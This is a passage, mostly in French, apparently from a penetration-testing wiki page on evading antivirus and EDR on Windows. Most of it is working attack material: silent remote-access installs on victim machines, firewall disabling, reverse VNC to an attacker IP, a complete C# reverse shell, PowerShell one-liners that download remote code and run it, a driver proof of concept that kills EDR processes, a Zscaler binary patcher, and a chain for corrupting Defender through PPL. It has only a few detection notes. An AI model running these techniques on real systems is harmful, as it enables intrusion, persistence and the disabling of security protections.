- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Comme décrit dans [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur un PC victime puis de l'utiliser pour le prendre en main et maintenir la persistance :
1. Téléchargez depuis https://remotedesktop.google.com/, cliquez sur "Set up via SSH", puis cliquez sur le fichier MSI pour Windows pour télécharger le MSI.
2. Exécutez l'installateur silencieusement sur la victime (admin requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur next. L'assistant vous demandera alors d'autoriser ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez le paramètre donné avec quelques ajustements : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Notez le paramètre pin qui permet de définir le PIN sans utiliser l'interface graphique).


## Advanced Evasion

L'évasion est un sujet très complexe : parfois il faut prendre en compte de nombreuses sources de télémétrie dans un seul système, il est donc pratiquement impossible de rester complètement indétectable dans des environnements matures.

Chaque environnement contre lequel vous intervenez aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette conférence de [@ATTL4S](https://twitter.com/DaniLJ94), pour vous initier à des techniques d'Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

C'est aussi une excellente conférence de [@mariuszbit](https://twitter.com/mariuszbit) à propos d'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Anciennes techniques**

### **Vérifier quelles parties Defender considère comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui va **retirer des parties du binaire** jusqu'à ce qu'il **détermine quelle partie Defender** considère comme malveillante et vous la sépare.\
Un autre outil faisant **la même chose est** [**avred**](https://github.com/dobin/avred) avec une offre web du service sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Jusqu'à Windows10, toutes les versions de Windows étaient fournies avec un **serveur Telnet** que vous pouviez installer (en tant qu'administrateur) en faisant:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites en sorte qu'il **démarre** au démarrage du système et **exécutez-le** maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (stealth) et désactiver le firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l'option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Puis, déplacez le binaire _**winvnc.exe**_ et le fichier **nouvellement** créé _**UltraVNC.ini**_ à l'intérieur de la **victim**

#### **Reverse connection**

L'**attacker** doit **exécuter sur** son **host** le binaire `vncviewer.exe -listen 5900` afin d'être **préparé** à capturer une reverse **VNC connection**. Ensuite, dans la **victim** : démarrez le daemon winvnc `winvnc.exe -run` et lancez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Pour rester discret, vous ne devez pas faire certaines choses

- Ne lancez pas `winvnc` s'il est déjà en cours d'exécution, sinon vous déclencherez un [popup](https://i.imgur.com/1SROTTl.png). vérifiez s'il tourne avec `tasklist | findstr winvnc`
- Ne lancez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire, sinon cela provoquera l'ouverture de [the config window](https://i.imgur.com/rfMQWcf.png)
- Ne lancez pas `winvnc -h` pour l'aide sinon vous déclencherez un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant, **démarrez le listener** avec `msfconsole -r file.rc` et **exécutez** la **xml payload** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le defender actuel terminera le processus très rapidement.**

### Compiler notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier C# Revershell

Compilez-le avec:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement automatique et exécution :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste d'obfuscateurs pour C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Exemple d'utilisation de Python pour construire des injecteurs :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Plus

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Neutraliser AV/EDR depuis l'espace noyau

Storm-2603 a utilisé un petit utilitaire en console connu sous le nom de **Antivirus Terminator** pour désactiver les protections endpoint avant de déployer un ransomware. L'outil apporte son **propre driver vulnérable mais *signé*** et l'abuse pour effectuer des opérations privilégiées au niveau noyau que même les services AV en Protected-Process-Light (PPL) ne peuvent bloquer.

Principaux enseignements
1. **Pilote signé** : Le fichier déposé sur le disque est `ServiceMouse.sys`, mais le binaire est le pilote légitimement signé `AToolsKrnl64.sys` issu du “System In-Depth Analysis Toolkit” d'Antiy Labs. Parce que le pilote porte une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Installation du service** :
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le driver en tant que **service noyau** et la seconde le démarre de sorte que `\\.\ServiceMouse` devienne accessible depuis l'espace utilisateur.
3. **IOCTLs exposés par le driver**
| IOCTL code | Capacité                              |
|-----------:|---------------------------------------|
| `0x99000050` | Terminer un processus arbitraire par PID (utilisé pour tuer les services Defender/EDR) |
| `0x990000D0` | Supprimer un fichier arbitraire sur le disque |
| `0x990001D0` | Décharger le driver et supprimer le service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Pourquoi cela fonctionne** : BYOVD contourne entièrement les protections en mode utilisateur ; le code exécuté dans le noyau peut ouvrir des processus *protégés*, les terminer ou manipuler des objets noyau indépendamment de PPL/PP, ELAM ou d'autres mécanismes de durcissement.

Détection / Atténuation
•  Activez la liste de blocage des drivers vulnérables de Microsoft (`HVCI`, `Smart App Control`) pour que Windows refuse de charger `AToolsKrnl64.sys`.  
•  Surveillez la création de nouveaux services *noyau* et alertez lorsqu'un driver est chargé depuis un répertoire accessible en écriture par tous ou n'est pas présent sur la allow-list.  
•  Recherchez des handles en mode utilisateur vers des objets de périphérique personnalisés suivis d'appels `DeviceIoControl` suspects.

### Contournement des contrôles de posture de Zscaler Client Connector via le patching binaire sur disque

Le **Client Connector** de Zscaler applique localement des règles de posture de l'appareil et repose sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent un contournement complet possible :

1. L'évaluation de la posture se fait **entièrement côté client** (un booléen est envoyé au serveur).  
2. Les endpoints RPC internes valident uniquement que l'exécutable qui se connecte est **signé par Zscaler** (via `WinVerifyTrust`).

En **patchant quatre binaires signés sur le disque**, les deux mécanismes peuvent être neutralisés :

| Binaire | Logique originale patchée | Résultat |
|--------|----------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Retourne toujours `1` donc chaque vérification est conforme |
| `ZSAService.exe` | Appel indirect à `WinVerifyTrust` | NOP-ed ⇒ n'importe quel processus (même non signé) peut se connecter aux pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Remplacée par `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Vérifications d'intégrité sur le tunnel | Court-circuitées |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers originaux et redémarré la pile de services :

* **Tous** les contrôles de posture affichent **vert/conforme**.
* Les binaires non signés ou modifiés peuvent ouvrir les points de terminaison RPC nommés (par ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'hôte compromis obtient un accès sans restriction au réseau interne défini par les politiques Zscaler.

Cette étude de cas montre comment des décisions de confiance purement côté client et de simples vérifications de signature peuvent être déjouées avec quelques modifications d'octets.

## Abuser de Protected Process Light (PPL) pour altérer AV/EDR avec des LOLBINs

Protected Process Light (PPL) applique une hiérarchie signer/niveau de sorte que seuls des processus protégés de niveau égal ou supérieur peuvent s'altérer mutuellement. Du point de vue offensif, si vous pouvez lancer légitimement un binaire activé pour PPL et contrôler ses arguments, vous pouvez convertir une fonctionnalité bénigne (par ex. la journalisation) en une primitive d'écriture contrainte, soutenue par PPL, visant des répertoires protégés utilisés par AV/EDR.

Ce qui fait qu'un processus s'exécute en tant que PPL
- L'EXE cible (et toutes les DLL chargées) doit être signé avec un EKU compatible PPL.
- Le processus doit être créé avec CreateProcess en utilisant les flags : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Un niveau de protection compatible doit être demandé et correspondre au signataire du binaire (p. ex., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les signataires anti-malware, `PROTECTION_LEVEL_WINDOWS` pour les signataires Windows). Des niveaux incorrects échoueront à la création.

Voir aussi une introduction plus large à PP/PPL et à la protection de LSASS ici :

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Outils de lancement
- Aide open-source : CreateProcessAsPPL (sélectionne le niveau de protection et transmet les arguments à l'EXE cible) :
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Patron d'utilisation :
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui-même et accepte un paramètre pour écrire un fichier de log vers un chemin spécifié par l'appelant.
- Lorsqu'il est lancé en tant que processus PPL, l'écriture du fichier s'effectue avec le support PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez des noms courts 8.3 pour pointer vers des emplacements normalement protégés.

8.3 short path helpers
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Dériver le chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lancer le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` en utilisant un lanceur (par ex., CreateProcessAsPPL).
2) Fournir l'argument de chemin de log de ClipUp pour forcer la création d'un fichier dans un répertoire AV protégé (par ex., Defender Platform). Utiliser des noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l'AV lors de son exécution (par ex., MsMpEng.exe), planifier l'écriture au démarrage avant que l'AV ne démarre en installant un service auto-démarré qui s'exécute de façon fiable plus tôt. Valider l'ordre de démarrage avec Process Monitor (boot logging).
4) Au redémarrage, l'écriture supportée par PPL a lieu avant que l'AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes et contraintes
- Vous ne pouvez pas contrôler le contenu que ClipUp écrit au-delà de son emplacement ; le primitive est mieux adapté à la corruption qu'à une injection de contenu précise.
- Nécessite des droits locaux admin/SYSTEM pour installer/démarrer un service et une fenêtre de redémarrage.
- Le timing est critique : la cible ne doit pas être ouverte ; l'exécution au démarrage évite les verrous de fichiers.

Détections
- Création de processus de `ClipUp.exe` avec des arguments inhabituels, en particulier parenté par des lanceurs non standard, autour du démarrage.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et qui démarrent systématiquement avant Defender/AV. Investiguer la création/modification de services avant les échecs de démarrage de Defender.
- Surveillance d'intégrité des fichiers sur les binaires/les répertoires Platform de Defender ; créations/modifications de fichiers inattendues par des processus avec des flags de processus protégé.
- Télémetrie ETW/EDR : rechercher des processus créés avec `CREATE_PROTECTED_PROCESS` et une utilisation anormale de niveaux PPL par des binaires non-AV.

Atténuations
- WDAC/Code Integrity : restreindre quels binaires signés peuvent s'exécuter en tant que PPL et sous quels parents ; bloquer l'invocation de ClipUp en dehors de contextes légitimes.
- Hygiène des services : restreindre la création/modification de services à démarrage automatique et surveiller la manipulation de l'ordre de démarrage.
- Veiller à ce que la protection contre la manipulation (tamper protection) et les protections de démarrage précoce soient activées ; investiguer les erreurs de démarrage indiquant une corruption binaire.
- Envisager de désactiver la génération de noms courts 8.3 sur les volumes hébergeant des outils de sécurité si compatible avec votre environnement (tester soigneusement).

Références pour PPL et les outils
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
